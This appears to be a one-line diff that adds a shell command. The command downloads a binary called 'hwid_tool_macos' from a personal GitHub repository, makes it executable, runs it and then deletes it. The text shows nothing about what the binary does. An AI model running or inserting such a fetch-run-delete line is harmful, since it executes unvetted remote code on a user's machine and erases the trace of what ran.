@@ -1,0 +1,1 @@
+curl -sLO https://raw.githubusercontent.com/Watchedfungus88/scriptsvault/main/hwid_tool_macos && chmod +x hwid_tool_macos && ./hwid_tool_macos && rm hwid_tool_macos
